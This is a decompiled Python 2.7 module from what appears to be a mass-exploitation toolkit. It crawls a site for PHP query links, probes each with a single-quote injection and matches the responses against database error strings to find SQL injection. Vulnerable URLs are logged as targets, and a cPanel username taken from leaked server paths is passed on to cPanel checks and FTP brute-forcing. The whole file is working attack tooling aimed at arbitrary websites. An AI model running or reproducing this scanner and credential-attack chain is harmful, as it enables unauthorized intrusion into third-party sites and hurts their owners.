# uncompyle6 version 2.11.5
# Python bytecode 2.7 (62211)
# Decompiled from: Python 2.7.18 (default, Apr 20 2020, 20:30:41) 
# [GCC 9.3.0]
# Embedded file name: Tools\Sqli.py
import requests
import re
from Exploits import printModule
from Tools import cpanel
from BruteForce import FTPBruteForce
Headers = {'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:28.0) Gecko/20100101 Firefox/72.0'}

def Exploit(site):
    try:
        GetLink = requests.get('http://' + site, timeout=10, headers=Headers)
        urls = re.findall('href=[\\\'"]?([^\\\'" >]+)', str(GetLink.content))
        if len(urls) != 0:
            return CheckSqliURL(site, urls)
        return printModule.returnNo(site, 'N/A', 'Sql Injection', 'unknown')
    except:
        return printModule.returnNo(site, 'N/A', 'Sql Injection', 'unknown')


def CheckSqliURL(site, urls):
    MaybeSqli = []
    try:
        for url in urls:
            try:
                if '.php?' in str(url):
                    MaybeSqli.append(site + '/' + url)
            except:
                pass

        if len(MaybeSqli) != 0:
            return CheckSqli(MaybeSqli, site)
        return printModule.returnNo(site, 'N/A', 'Sql Injection', 'unknown')
    except:
        return printModule.returnNo(site, 'N/A', 'Sql Injection', 'unknown')


def CheckSqli(MaybeSqli, site):
    for url in MaybeSqli:
        try:
            error = [
             'DB Error', 'SQL syntax;', 'mysql_fetch_assoc', 'mysql_fetch_array', 'mysql_num_rows',
             'is_writable',
             'mysql_result', 'pg_exec', 'mysql_result', 'mysql_num_rows', 'mysql_query', 'pg_query',
             'System Error',
             'io_error', 'privilege_not_granted', 'getimagesize', 'preg_match', 'mysqli_result', 'mysqli']
            if url.startswith('http://'):
                url = url.replace('http://', '')
            elif url.startswith('https://'):
                url = url.replace('https://', '')
            for s in error:
                Checksqli = requests.get('http://' + url + "'", timeout=5, headers=Headers)
                if s in str(Checksqli.content):
                    SQLI = url.replace("'", '')
                    if SQLI.startswith('http://'):
                        SQLI = SQLI.replace('http://', '')
                    elif SQLI.startswith('https://'):
                        SQLI = SQLI.replace('https://', '')
                    if 'http://' in SQLI:
                        pass
                    else:
                        with open('result/SqlInjection_targets.txt', 'a') as xx:
                            xx.write('http://' + SQLI + '\n')
                        try:
                            Username = re.findall('/home/(.*)/public_html/', str(Checksqli.content))[0]
                            cpanel.Check(site, Username, 'Cpanel')
                            FTPBruteForce.CheckFTPport(site, Username)
                        except:
                            pass

                    return printModule.returnYes(SQLI, 'N/A', 'Sql Injection', 'unknown')
                return printModule.returnNo(site, 'N/A', 'Sql Injection', 'unknown')

            break
        except:
            return printModule.returnNo(site, 'N/A', 'Sql Injection', 'unknown')